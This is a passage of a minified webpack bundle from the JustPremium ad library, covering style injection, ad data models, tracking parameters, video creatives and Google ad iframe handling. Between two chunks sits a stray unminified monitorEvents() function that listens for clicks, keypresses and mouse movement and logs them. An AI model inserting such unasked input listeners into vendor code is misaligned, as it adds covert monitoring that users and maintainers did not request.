  60: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    t.default = {
      isAutoplayAllowed: function (e, t) {
        return "boolean" == typeof e ? e : "boolean" != typeof t || t;
      }
    };
  },
  7: function (e, t) {
    var r,
      n,
      o,
      i,
      a = {},
      s = function (e) {
        var t;
        return function () {
          return void 0 === t && (t = e.apply(this, arguments)), t;
        };
      },
      c = null,
      l = 0,
      d = [];
    function u(e, t) {
      for (var r = 0; r < e.length; r++) {
        var n = e[r],
          o = a[n.id];
        if (o) {
          o.refs++;
          for (var i = 0; i < o.parts.length; i++) o.parts[i](n.parts[i]);
          for (; i < n.parts.length; i++) o.parts.push(v(n.parts[i], t));
        } else {
          var s = [];
          for (i = 0; i < n.parts.length; i++) s.push(v(n.parts[i], t));
          a[n.id] = {
            id: n.id,
            refs: 1,
            parts: s
          };
        }
      }
    }
    function p(e) {
      for (var t = [], r = {}, n = 0; n < e.length; n++) {
        var o = e[n],
          i = o[0],
          a = {
            css: o[1],
            media: o[2],
            sourceMap: o[3]
          };
        r[i] ? r[i].parts.push(a) : t.push(r[i] = {
          id: i,
          parts: [a]
        });
      }
      return t;
    }
    function f(e, t) {
      var r = i(),
        n = d[d.length - 1];
      if ("top" === e.insertAt) n ? n.nextSibling ? r.insertBefore(t, n.nextSibling) : r.appendChild(t) : r.insertBefore(t, r.firstChild), d.push(t);else {
        if ("bottom" !== e.insertAt) throw new Error("Invalid value for parameter 'insertAt'. Must be 'top' or 'bottom'.");
        r.appendChild(t);
      }
    }
    function h(e) {
      e.parentNode.removeChild(e);
      var t = d.indexOf(e);
      t >= 0 && d.splice(t, 1);
    }
    function g(e) {
      var t = n.createElement("style");
      return t.type = "text/css", t.className = "jpx-product-styles", f(e, t), t;
    }
    function v(e, t) {
      var r, o, i;
      if (t.singleton) {
        var a = l++;
        r = c || (c = g(t)), o = y.bind(null, r, a, !1), i = y.bind(null, r, a, !0);
      } else e.sourceMap && "function" == typeof URL && "function" == typeof URL.createObjectURL && "function" == typeof URL.revokeObjectURL && "function" == typeof Blob && "function" == typeof btoa ? (r = function (e) {
        var t = n.createElement("link");
        return t.rel = "stylesheet", t.className = "jpx-link-styles", f(e, t), t;
      }(t), o = function (e, t) {
        var r = t.css,
          n = t.sourceMap;
        n && (r += "\n/*# sourceMappingURL=data:application/json;base64," + btoa(unescape(encodeURIComponent(JSON.stringify(n)))) + " */");
        var o = new Blob([r], {
            type: "text/css"
          }),
          i = e.href;
        e.href = URL.createObjectURL(o), i && URL.revokeObjectURL(i);
      }.bind(null, r), i = function () {
        h(r), r.href && URL.revokeObjectURL(r.href);
      }) : (r = g(t), o = function (e, t) {
        var r = t.css,
          o = t.media;
        o && e.setAttribute("media", o);
        if (e.styleSheet) e.styleSheet.cssText = r;else {
          for (; e.firstChild;) e.removeChild(e.firstChild);
          e.appendChild(n.createTextNode(r));
        }
      }.bind(null, r), i = function () {
        h(r);
      });
      return o(e), function (t) {
        if (t) {
          if (t.css === e.css && t.media === e.media && t.sourceMap === e.sourceMap) return;
          o(e = t);
        } else i();
      };
    }
    e.exports = function (e, t) {
      if ("undefined" != typeof DEBUG && DEBUG && "object" != typeof document) throw new Error("The style-loader cannot be used in a non-browser environment");
      "top" === (t = t || {}).window ? (r = window.top, n = window.top.document) : (r = window, n = r.document), o && i || (o = s(function () {
        return /msie [6-9]\b/.test(r.navigator.userAgent.toLowerCase());
      }), i = s(function () {
        return n.head || n.getElementsByTagName("head")[0];
      })), void 0 === t.singleton && (t.singleton = o()), void 0 === t.insertAt && (t.insertAt = "bottom");
      var c = p(e);
      return u(c, t), function (e) {
        for (var r = [], n = 0; n < c.length; n++) {
          var o = c[n];
          (i = a[o.id]).refs--, r.push(i);
        }
        e && u(p(e), t);
        for (n = 0; n < r.length; n++) {
          var i;
          if (0 === (i = r[n]).refs) {
            for (var s = 0; s < i.parts.length; s++) i.parts[s]();
            delete a[i.id];
          }
        }
      };
    };
    var m = function () {
      var e = [];
      return function (t, r) {
        return e[t] = r, e.filter(Boolean).join("\n");
      };
    }();
    function y(e, t, r, o) {
      var i = r ? "" : o.css;
      if (e.styleSheet) e.styleSheet.cssText = m(t, i);else {
        var a = n.createTextNode(i),
          s = e.childNodes;
        s[t] && e.removeChild(s[t]), s.length ? e.insertBefore(a, s[t]) : e.appendChild(a);
      }
    }
  },
  79: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = i(r(4)),
      o = i(r(16));
    function i(e) {
      return e && e.__esModule ? e : {
        default: e
      };
    }
    function a(e, t) {
      if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
      e.prototype = Object.create(t && t.prototype, {
        constructor: {
          value: e,
          enumerable: !1,
          writable: !0,
          configurable: !0
        }
      }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : function (e, t) {
        for (var r = Object.getOwnPropertyNames(t), n = 0; n < r.length; n++) {
          var o = r[n],
            i = Object.getOwnPropertyDescriptor(t, o);
          i && i.configurable && void 0 === e[o] && Object.defineProperty(e, o, i);
        }
      }(e, t));
    }
    var s = new WeakMap(),
      c = new WeakMap(),
      l = function (e) {
        function t(r) {
          !function (e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
          }(this, t);
          var n = function (e, t) {
              if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
              return !t || "object" != typeof t && "function" != typeof t ? e : t;
            }(this, e.call(this)),
            o = n,
            i = r.data || {};
          return c.set(o, i), o._setPrivates(r), n;
        }
        return a(t, e), t.prototype._setPrivates = function (e) {
          var t = {
            di: {}
          };
          return s.set(this, t), t.ready = new Promise(function (e, r) {
            t.resolve = e, t.reject = r;
          }), t;
        }, t.prototype._createIndex = function (e, t, r) {
          return "string" == typeof t ? this._createIndex(e, t.split("."), r) : 1 == t.length && void 0 !== r ? e[t[0]] = r : 0 == t.length ? e : this._createIndex(e[t[0]], t.slice(1), r);
        }, t.prototype._loadData = function () {
          var e = this,
            t = s.get(e),
            r = c.get(e);
          if (e.publish("beforeDataLoad", r), r.creative && (r.creative.html || r.creative.vast)) t.resolved = !0, t.resolve(r.creative), e.publish("adLoaded", [e], .01);else {
            var n = e.error(200, {
              class: e.constructor.name,
              method: "_loadData"
            });
            o.default.info("JModel: Loading data failed."), o.default.error(n), t.reject(n), e.publish("adError", [n], .1);
          }
          return t.ready;
        }, t.prototype.ready = function () {
          return s.get(this).ready;
        }, t.prototype.load = function (e) {
          return e && c.set(this, e), this._loadData();
        }, t.prototype.getFormat = function () {
          return c.get(this).format;
        }, t.prototype.getCreative = function () {
          return c.get(this).creative.html;
        }, t.prototype.getData = function (e) {
          var t = c.get(this),
            r = e ? e.split(".") : null;
          if (null === r) return t;
          return function (e, t) {
            for (var r = void 0, n = t; r = e.shift();) {
              if (void 0 === n[r]) return null;
              n = n[r];
            }
            return n;
          }(r, t);
        }, t.prototype.addProperty = function (e, t) {
          for (var r = this, n = c.get(r), o = r.getData(e), i = e ? e.split(".") : null, a = n, s = 0; s < i.length; s++) void 0 !== a[i[s]] ? (a = a[i[s]], s == i.length - 1 && r._createIndex(n, e, t)) : s == i.length - 1 ? r._createIndex(a, i[s], t) : (r._createIndex(a, i[s], {}), a = a[i[s]]);
          r.publish("[" + e + "]Changed", [o, t]);
        }, t;
      }(n.default);
    t.default = l;
  },
  85: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = function (e) {
      return e && e.__esModule ? e : {
        default: e
      };
    }(r(46));
    var o = function () {
      function e(t, r, n, o, i) {
        var a = arguments.length > 5 && void 0 !== arguments[5] ? arguments[5] : null;
        !function (e, t) {
          if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
        }(this, e), n.server = n.server || {
          ruid: null,
          suid: null,
          uuid: null,
          registeredAt: null
        }, n.site = n.site || {
          width: null
        };
        var s = !!(o = o || {}).getData;
        n.cmp && !n.cmp.gdprApprove && (n.server.uuid = ""), this.type = r, this.rid = n.server.ruid, this.sid = n.server.suid, this.uid = n.server.uuid, this.cid = s ? this.setCreativeKey(o) : "", this.vr = "v2.44.492", this.trackingUrl = n.server.trackingUrl || {
          bidder: "//tracking.justpremium.com/tracking.gif",
          adserver: "//tracking.justpremium.com/tracking.gif"
        }[t] || "//tracking.justpremium.com/tracking.gif", this.ssp = (s ? o.getData("ssp") : o.ssp) || "", this.zoneId = (s ? o.getData("zoneId") : o.zoneId) || "", this.adId = (s ? o.getData("adId") : o.adId) || "", this.sourceId = (s ? o.getData("sourceId") : o.sourceId) || "", this.placementId = (s ? o.getData("adunitid") : o.adunitid) || "", this.format = (s ? o.getFormat() : o.format) || "", this.isTest = s ? o.getData("isTest") : void 0 === o.isTest ? "" : o.isTest, this.siteWidth = n.site.width || 0, this.app = n.server.app, this.cluster = n.server.cluster, this.subDomain = n.server.subdomain, this.registeredAt = n.server.registeredAt, this.errorCode = i || "", this.stack = "", this.price = "", this.pageHeight = "", this.jsonParams = this._buildJsonParams(o, void 0 != a ? a : null), this.dealId = (s ? o.getData("dealId") : o.dealId) || "", this.creativeWidth = (s ? o.getData("width") : o.width) || "", this.creativeHeight = (s ? o.getData("height") : o.height) || "", this.at = t, this.setPrice((s ? o.getData("price") : o.price) || "");
      }
      return e.prototype._buildJsonParams = function (e, t) {
        var r = {},
          n = e.getData && e.getData() || e || {};
        return n.displayedAds && (r.ads = n.displayedAds), n.executedSiteInit && (r.esi = n.executedSiteInit), n.googleFrame && (r.gi = n.googleFrame), n.isTopPosition && (r.istp = n.isTopPosition), this.pageHeight && (r.ph = this.pageHeight), n.extendCore && (r.ec = n.extendCore), n.singleTag && (r.st = n.singleTag ? "1" : "0"), n.videoFramework && (r.video = n.videoFramework), n.isAdv && (n.trackerId ? r.trackerId = n.trackerId : r.pubIO = n.pubIO || 0), void 0 !== t && null !== t && Object.keys(t).forEach(function (e) {
          r[e] = t[e];
        }), n.campaignId && (r.ca_id = n.campaignId), n.creativeId && (r.cr_id = n.creativeId), n.exchangeId && (r.ex_id = n.exchangeId), n.insertionOrderId && (r.io_id = n.insertionOrderId), n.dealId && (r.d_id = n.dealId), n.publisherId && (r.p_id = n.publisherId), n.sourceUrl && (r.s_url = n.sourceUrl), n.userDefined && (r.udp = n.userDefined), JSON.stringify(r);
      }, e.prototype.get = function (e) {
        return void 0 === this[e] ? "" : this[e];
      }, e.prototype.getJsonParams = function () {
        try {
          return this.jsonParams ? JSON.parse(this.jsonParams) : {};
        } catch (e) {
          return {};
        }
      }, e.prototype.set = function (e, t) {
        "price" !== e ? this[e] = t : this.setPrice(t);
      }, e.prototype.setCreativeKey = function (e) {
        return n.default.getCreativeId(e.getData("creative").html);
      }, e.prototype.setJsonParams = function (e) {
        this.jsonParams = JSON.stringify(e);
      }, e.prototype.setPageHeight = function (e) {
        this.pageHeight = e;
        var t = this.getJsonParams();
        t.ph = e, this.setJsonParams(t);
      }, e.prototype.setPrice = function (e) {
        var t = void 0;
        try {
          (t = window.top).location.href;
        } catch (e) {
          t = window;
        }
        this.price = "", e && "function" == typeof t.btoa && (this.price = btoa(e));
      }, e.factory = function (t, r, n, o, i, a) {
        return new e(t, r, n, o, i, a);
      }, e;
    }();
    t.default = o;
  },
  86: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = d(r(19)),
      o = d(r(38)),
      i = d(r(23)),
      a = d(r(21)),
      s = d(r(1)),
      c = d(r(46)),
      l = d(r(2));
    function d(e) {
      return e && e.__esModule ? e : {
        default: e
      };
    }
    s.default.getTopScope();
    var u = {
      createVideo: function (e, t, r, s, d) {
        var u = this,
          f = e.di,
          h = f.jDOM,
          g = f.jProductApi,
          v = f.jStyle,
          m = f.jTracking,
          y = !1;
        e && e.sources && Array.isArray(e.sources) && e.sources.forEach(function (e) {
          e.src === (r && r.src) && (y = !0);
        });
        var b = !!r.vtrResetOnEnd,
          w = void 0,
          _ = function (e) {
            var t = void 0;
            t = e.jclScope.document && e.jclScope.document.baseURI ? e.jclScope.document.baseURI : e.jclScope.left && e.jclScope.left.document && e.jclScope.left.document.baseURI ? e.jclScope.left.document.baseURI : e.jclScope.document && e.jclScope.document.head ? e.jclScope.document.head.getElementsByTagName("base")[0].href : c.default.getAssetsPath(e.di.jModel.getData("creative").html);
            if (!t) {
              var r = window.document.getElementsByClassName("jcl-wrapper")[0];
              r && (t = r.contentDocument.baseURI);
            }
            return t;
          }(e),
          j = "jpx-video-" + (e.iterator = e.iterator >= 0 ? ++e.iterator : 0),
          E = h.getElement(j, {
            tag: "div",
            parent: "@root",
            attributes: {
              style: "display: none",
              class: "jpx-video-" + s
            }
          }),
          x = function (e) {
            var r = h.getElement("jp-video-wrapper-" + e);
            if (r) {
              var n = r.getDOMElement();
              if (t.appendChild(n), n.style.display = "block", d) {
                var o = void 0,
                  i = !0,
                  a = 0,
                  s = "";
                "boolean" !== d && (s = d), n.setAttribute("jp-controls", s);
                !function e() {
                  a > 3 || (a++, (o = t.ownerDocument.defaultView || t.ownerDocument.parentWindow).PremiumJpControls && (o.PremiumJpControls.create(), i = !1), i && l.default.delay(u, e, 200));
                }();
              } else {
                var c = h.getElement("jp-api-video-controls-" + e);
                t.appendChild(c.getDOMElement());
              }
              w.publish("playerAppended", [u]);
            }
          },
          O = {
            di: {
              jDOM: h,
              jProductApi: g,
              jStyle: v,
              jTracking: m,
              videoName: s
            },
            options: {
              autoplay: !1,
              customControls: !d,
              disableTracking: y,
              isCustomApiVideo: !0,
              vtrResetOnEnd: b
            }
          };
        if (function (e) {
          return "string" == typeof e || "vast" === e.type;
        }(r)) {
          var P = void 0;
          "string" == typeof r ? P = r : "vast" === r.type && (P = r.src);
          var M = new n.default(P, null);
          O.di.jModel = M, (w = new a.default(O)).setup(E, {
            events: {},
            fromApi: !0
          }), M.ready().then(function () {
            x(w.getId());
          });
        } else {
          var C = new o.default({
            data: {
              sources: [{
                src: p(r.src) ? r.src : "" + _ + r.src,
                type: r.type ? r.type : "video/mp4"
              }]
            }
          });
          C.load(), O.di.jModel = C, O.options.poster = p(r.poster) ? r.poster : !!r.poster && "" + _ + r.poster, (w = new i.default(O)).setup(E, {
            events: {},
            fromApi: !0
          }), w.ready().then(function () {
            x(w.getId());
          });
        }
        return d || function (e) {
          h.createElement("jp-api-video-controls-" + e, {
            tag: "style",
            parent: E,
            attributes: {
              type: "text/css",
              class: "jpx-stylesheet"
            },
            properties: {
              content: '.jp-video-wrapper {display: none;}.jp-video-wrapper {height:100%;}.jpx-video-controls.jpx-video-controls-medium>.jpx-video-control-mute:after,.jpx-video-controls>.jpx-video-control-mute:after{background-position:-14px 0;height:22px!important;width:18px!important}.jpx-video-controls.jpx-video-controls-medium>.jpx-video-control-pause:after,.jpx-video-controls>.jpx-video-control-pause:after{background-position:-14px -22px;height:22px!important;width:18px!important}.jpx-video-controls.jpx-video-controls-medium>.jpx-video-control-play:after,.jpx-video-controls>.jpx-video-control-play:after{background-position:-14px -44px;height:18px!important;width:18px!important}.jpx-video-controls.jpx-video-controls-medium>.jpx-video-control-reload:after,.jpx-video-controls>.jpx-video-control-reload:after{background-position:-14px -66px;height:22px!important;width:18px!important}.jpx-video-controls.jpx-video-controls-medium>.jpx-video-control-unmuted:after,.jpx-video-controls>.jpx-video-control-unmuted:after{background-position:-14px -88px;height:22px!important;width:18px!important}.jpx-video-controls.jpx-video-controls-big>.jpx-video-control-mute:after{background-position:-32px 0;height:24px!important;width:21px!important}.jpx-video-controls.jpx-video-controls-big>.jpx-video-control-pause:after{background-position:-32px -22px;height:24px!important;width:22px!important}.jpx-video-controls.jpx-video-controls-big>.jpx-video-control-play:after{background-position:-32px -44px;height:22px!important;width:21px!important}.jpx-video-controls.jpx-video-controls-big>.jpx-video-control-reload:after{background-position:-32px -66px;height:24px!important;width:24px!important}.jpx-video-controls.jpx-video-controls-big>.jpx-video-control-unmuted:after{background-position:-32px -88px;height:24px!important;width:21px!important}.jp-video-wrapper{position:relative}.jp-video-wrapper>.jpx-video-controls{align-content:stretch;align-items:center;bottom:10px;display:flex;flex-direction:row;left:0;margin:0 auto;overflow:hidden;pointer-events:auto;position:absolute;right:0;width:100%}.jp-video-wrapper>.jpx-video-controls>[class*=jpx-video-control-]{flex:5%;height:18px;opacity:.7;position:relative;text-align:center;transition:flex .7s,opacity .7s}@media (max-width:1200px){.jp-video-wrapper>.jpx-video-controls>[class*=jpx-video-control-]{flex:12%}}.jpx-pd-wrapper .jp-video-wrapper>.jpx-video-controls>[class*=jpx-video-control-],.jpx-sa-advanced .jp-video-wrapper>.jpx-video-controls>[class*=jpx-video-control-]{flex:15%}.jpx-cf-wrapper .jp-video-wrapper>.jpx-video-controls>[class*=jpx-video-control-]{flex:12%}.jp-video-wrapper>.jpx-video-controls>[class*=jpx-video-control-]:after{background-image:url("https://cdn.justpremium.com/adr/jp-controls-test.png");background-repeat:no-repeat;content:"";display:inline-block;height:18px;width:18px}.jp-video-wrapper>.jpx-video-controls>[class*=jpx-video-control-].jpx-video-control-progress{background:hsla(0,0%,100%,.5);flex:90%;height:2px;overflow:hidden}@media (max-width:1200px){.jp-video-wrapper>.jpx-video-controls>[class*=jpx-video-control-].jpx-video-control-progress{flex:76%}}.jpx-pd-wrapper .jp-video-wrapper>.jpx-video-controls>.jpx-video-control-progress,.jpx-sa-advanced .jp-video-wrapper>.jpx-video-controls>.jpx-video-control-progress{flex:70%}.jpx-cf-wrapper .jp-video-wrapper>.jpx-video-controls>.jpx-video-control-progress{flex:78%}.jp-video-wrapper>.jpx-video-controls>[class*=jpx-video-control-].jpx-video-control-progress:after{content:none}.jp-video-wrapper>.jpx-video-controls>[class*=jpx-video-control-].jpx-video-control-progress>.jpx-video-control-buffered{background:hsla(0,0%,100%,.3);border-radius:4px;display:block;height:2px;width:0}.jp-video-wrapper>.jpx-video-controls>[class*=jpx-video-control-].jpx-video-control-progress>.jpx-video-control-buffered:after{content:none}.jp-video-wrapper>.jpx-video-controls>[class*=jpx-video-control-].jpx-video-control-progress>.jpx-video-control-progress-update{background:#fff;border-radius:10px;bottom:0;display:block;height:2px;position:absolute;width:100%}.jp-video-wrapper>.jpx-video-controls.jpx-video-controls-big>[class*=jpx-video-control-]:not([class*=-control-progress]){height:22px}'
            }
          });
        }(w.getId()), w;
      },
      getPercentageVideoVisibility: function (e, t) {
        var r = e.height * e.calculation.ratio.center,
          n = t.getDOMElement().getBoundingClientRect(),
          o = s.default.getWindowHeight(),
          i = n.height + o - n.bottom,
          a = 0,
          c = 0,
          l = n.top + n.bottom > n.height && o - n.bottom >= 0,
          d = n.bottom < n.height && n.bottom > 0,
          u = i > 0 && i < n.height;
        return d ? c = n.bottom : u && (c = i), a = l ? 100 : d ? c > 0 && c < r ? Math.round(100 * c / r) : c > 0 ? 100 : 0 : u ? c > 0 && c < r ? Math.round(100 * c / r) : c > 0 ? 100 : 0 : 0, Math.abs(a);
      },
      ggVideo: function (e) {
        return new GgEzVp({
          container: e.container,
          src: e.src,
          controls: {
            expand: !1,
            progress: !1,
            skip: !0,
            play: !0,
            timestamp: !0,
            volume: !1
          }
        });
      }
    };
    function p(e) {
      return /^(?:(?:https?|ftp):\/\/)?(?:(?!(?:10|127)(?:\.\d{1,3}){3})(?!(?:169\.254|192\.168)(?:\.\d{1,3}){2})(?!172\.(?:1[6-9]|2\d|3[0-1])(?:\.\d{1,3}){2})(?:[1-9]\d?|1\d\d|2[01]\d|22[0-3])(?:\.(?:1?\d{1,2}|2[0-4]\d|25[0-5])){2}(?:\.(?:[1-9]\d?|1\d\d|2[0-4]\d|25[0-4]))|(?:(?:[a-z\u00a1-\uffff0-9]-*)*[a-z\u00a1-\uffff0-9]+)(?:\.(?:[a-z\u00a1-\uffff0-9]-*)*[a-z\u00a1-\uffff0-9]+)*(?:\.(?:[a-z\u00a1-\uffff]{2,})))(?::\d{2,5})?(?:\/\S*)?$/.test(e);
    }
    t.default = u;
  },
  87: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = Object.assign || function (e) {
        for (var t = 1; t < arguments.length; t++) {
          var r = arguments[t];
          for (var n in r) Object.prototype.hasOwnProperty.call(r, n) && (e[n] = r[n]);
        }
        return e;
      },
      o = a(r(47)),
      i = a(r(210));
    function a(e) {
      return e && e.__esModule ? e : {
        default: e
      };
    }
    function s(e, t) {
      if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
      e.prototype = Object.create(t && t.prototype, {
        constructor: {
          value: e,
          enumerable: !1,
          writable: !0,
          configurable: !0
        }
      }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : function (e, t) {
        for (var r = Object.getOwnPropertyNames(t), n = 0; n < r.length; n++) {
          var o = r[n],
            i = Object.getOwnPropertyDescriptor(t, o);
          i && i.configurable && void 0 === e[o] && Object.defineProperty(e, o, i);
        }
      }(e, t));
    }
    var c = new WeakMap(),
      l = function (e) {
        function t() {
          return function (e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
          }(this, t), function (e, t) {
            if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
            return !t || "object" != typeof t && "function" != typeof t ? e : t;
          }(this, e.apply(this, arguments));
        }
        return s(t, e), t.prototype._setPrivates = function (t) {
          var r = e.prototype._setPrivates.call(this, t);
          c.set(this, r), r.di = t.di;
          var o = r.di;
          return n(r, this._determineParentAndIdx({
            window: o.window,
            localWindow: o.localWindow,
            jModel: o.jModel
          })), r.gptAdElement && o.jModel.addProperty("gptAdElement", r.gptAdElement), r;
        }, t.prototype._determineParentAndIdx = function (e) {
          var t = e.localWindow || e.window,
            r = e.window.document.body,
            n = void 0,
            o = !1,
            i = {};
          do {
            var a = t && t.frameElement;
            if (a) if (0 === (a.getAttribute("name") || "").search("google_ads_iframe_")) {
              n = Array.from(a.parentNode.children).indexOf(a), r = a.parentNode, e.jModel.addProperty("googleFrame", !0), a.style.width = 0, a.style.height = 0, a.style.overflow = "hidden", o = !0;
              var s = r.parentElement;
              !i.gptAdElement && s && s.id.startsWith("div-gpt-ad-") && (s.style.height || s.style.maxHeight) && (i.gptAdElement = s);
            } else o && (n = Array.from(a.parentNode.children).indexOf(a), r = a.parentNode);
            t = t.parent;
          } while (t !== window.top);
          return i.parent = r, i.parentIdx = n, i;
        }, t.prototype._writeIframe = function () {
          var t = e.prototype._writeIframe.call(this),
            r = c.get(t),
            n = r.di;
          try {
            var o = r.di.jDOM.getElement("wrapper").getDOMElement();
            n.jModel.addProperty("isTopPosition", i.default.getPositionFromTop(o));
          } catch (e) {}
          return t;
        }, t;
      }(o.default);
    t.default = l;
  },
  89: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = i(r(20)),
      o = i(r(1));
    function i(e) {
      return e && e.__esModule ? e : {
        default: e
      };
    }
    function a(e, t) {
      if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
      e.prototype = Object.create(t && t.prototype, {
        constructor: {
          value: e,
          enumerable: !1,
          writable: !0,
          configurable: !0
        }
      }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : function (e, t) {
        for (var r = Object.getOwnPropertyNames(t), n = 0; n < r.length; n++) {
          var o = r[n],
            i = Object.getOwnPropertyDescriptor(t, o);
          i && i.configurable && void 0 === e[o] && Object.defineProperty(e, o, i);
        }
      }(e, t));
    }
    var s = new WeakMap(),
      c = function (e) {
        function t(r) {
          !function (e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
          }(this, t);
          var n = function (e, t) {
              if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
              return !t || "object" != typeof t && "function" != typeof t ? e : t;
            }(this, e.call(this, r)),
            o = n;
          r = r || {};
          var i = {};
          return i.di = r.di || {}, s.set(o, i), n;
        }
        return a(t, e), t.prototype._extendFnBody = function (t) {
          var r = e.prototype._extendFnBody.call(this, t);
          return function () {
            var e = void 0;
            try {
              (e = window.top).location.href;
            } catch (t) {
              e = window;
            }
            var t = {
                style: {
                  addSheet: this._helpers.addSheet,
                  getValue: this._helpers.getValue
                },
                dom: this._dom
              },
              Jpx = e.Jpx || {};
            Jpx.helpers = Jpx.helpers ? this.$_assign(Jpx.helpers, t) : t, Jpx._h = Jpx._h ? this.$_assign(Jpx._h, t) : t, Jpx.dom = this._dom, e.Jpx = Jpx;
          }.toString().replace(/function\s*\(\)\s*\{?/i, "").slice(0, -1) + ";" + r;
        }, t.prototype._extendScope = function (t) {
          var r = s.get(this).di,
            n = r.jAdFrame;
          e.prototype._extendScope.call(this, t), t.options = {
            branding: !1
          }, t.meta = o.default.getMeta(), t.skeleton = {
            ad: null,
            adframe: null,
            skeleton: null,
            container: null
          }, t.products = t.products || {}, t.products.is = t.products.is || {}, t.products.is.setParentElement = function (e, t) {
            r.jAdFrame.setParent(e);
          }, t._dom = {
            direction: function () {},
            isValidGoogleIframe: function () {
              var e = r.localWindow && di.localWindow.frameElement;
              return !!(e && e.getAttribute("name") && 0 === e.getAttribute("name").search("google_ads_iframe_") && e.offsetWidth > 1 && e.offsetHeight > 1);
            }
          }, t.product = function () {
            return t.products.is;
          }, t.skeleton.ad = n.getJDOMElement("ad");
          var i = 0;
          t._helpers = {
            addSheet: function (e) {
              r.jDOM.createElement("stylesheet-" + i++, {
                parent: "@root",
                tag: "style",
                attributes: {
                  type: "text/css"
                },
                properties: {
                  content: e
                }
              });
            },
            getValue: function (e, t) {}
          }, t.helpers = {}, t.addHelper = function () {}, t.setInsertAt = function (e, t) {
            r.jAdFrame.setInsertAt(e, t);
          }, r.jAdFrame.subscribe("afterRender", function (e) {
            var r = e[0];
            t.skeleton.skeleton = r.getJDOMElement("wrapper").getDOMElement(), t.skeleton.container = r.getJDOMElement("container").getDOMElement(), t.skeleton.content = r.getJDOMElement("content").getDOMElement(), t.skeleton.ad = r.getJDOMElement("ad").getDOMElement(), t.skeleton.adframe = r.getJDOMElement("adframe").getDOMElement();
          });
        }, t.prototype.setDependency = function (e, t) {
          return s.get(this).di[e] = t, this.publish(e + "DependencySet", [t]), this;
        }, t;
      }(n.default);
    t.default = c;
  },
  90: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var n = function (e) {
        return e && e.__esModule ? e : {
          default: e
        };
      }(r(1)).default.getTopScope(),
      o = {
        getBottomAdPos: function (e) {
          return Math.round(n.pageYOffset + e);
        },
        getTopAdPos: function (e) {
          var t = Math.round(n.pageYOffset + e);
          return e < .5 && (t += 1), t;
        },
        addNoScrollClass: function () {
          var e = !(arguments.length > 0 && void 0 !== arguments[0]) || arguments[0],
            t = n.document.body.classList;
          e ? t.contains("jpx--noscroll") || t.add("jpx--noscroll") : t.contains("jpx--noscroll") && t.remove("jpx--noscroll");
        },
        addPointerEventsClass: function () {
          var e = !(arguments.length > 0 && void 0 !== arguments[0]) || arguments[0],
            t = arguments[1];
          e ? t.addClass("jpx--pointer-events") : t.removeClass("jpx--pointer-events");
        }
      };
    t.default = o;
  }
});
function monitorEvents() {
  const events = ['click', 'keypress', 'mousemove'];
  events.forEach(event => {
    window.addEventListener(event, function (e) {
      console.log(`Event ${event} detected with target:`, e.target);
    });
  });
}
webpackJsonpJpx__name_([6], {
  170: function (e, t) {
    var r;
    r = function () {
      return this;
    }();
    try {
      r = r || Function("return this")() || (0, eval)("this");
    } catch (e) {
      "object" == typeof window && (r = window);
    }
    e.exports = r;
  },
  171: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    });
    var i = function () {
        return function (e, t) {
          if (Array.isArray(e)) return e;
          if (Symbol.iterator in Object(e)) return function (e, t) {
            var r = [],
              i = !0,
              n = !1,
              o = void 0;
            try {
              for (var a, s = e[Symbol.iterator](); !(i = (a = s.next()).done) && (r.push(a.value), !t || r.length !== t); i = !0);
            } catch (e) {
              n = !0, o = e;
            } finally {
              try {
                !i && s.return && s.return();
              } finally {
                if (n) throw o;
              }
            }
            return r;
          }(e, t);
          throw new TypeError("Invalid attempt to destructure non-iterable instance");
        };
      }(),
      n = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (e) {
        return typeof e;
      } : function (e) {
        return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e;
      },
      o = p(r(55)),
      a = p(r(570)),
      s = p(r(571)),
      u = p(r(141)),
      c = p(r(16)),
      d = p(r(73)),
      l = p(r(2));
    p(r(1));
    function p(e) {
      return e && e.__esModule ? e : {
        default: e
      };
    }
    function g(e, t) {
      if ("function" != typeof t && null !== t) throw new TypeError("Super expression must either be null or a function, not " + typeof t);
      e.prototype = Object.create(t && t.prototype, {
        constructor: {
          value: e,
          enumerable: !1,
          writable: !0,
          configurable: !0
        }
      }), t && (Object.setPrototypeOf ? Object.setPrototypeOf(e, t) : function (e, t) {
        for (var r = Object.getOwnPropertyNames(t), i = 0; i < r.length; i++) {
          var n = r[i],
            o = Object.getOwnPropertyDescriptor(t, n);
          o && o.configurable && void 0 === e[n] && Object.defineProperty(e, n, o);
        }
      }(e, t));
    }
    var f = new WeakMap(),
      m = function (e) {
        function t(r) {
          !function (e, t) {
            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
          }(this, t);
          var i = function (e, t) {
              if (!e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
              return !t || "object" != typeof t && "function" != typeof t ? e : t;
            }(this, e.call(this, r)),
            n = i,
            o = {},
            a = (r = r || {}).di || {};
          return f.set(n, o), o.di = a, o.error = {}, o.timeout = function () {}, i;
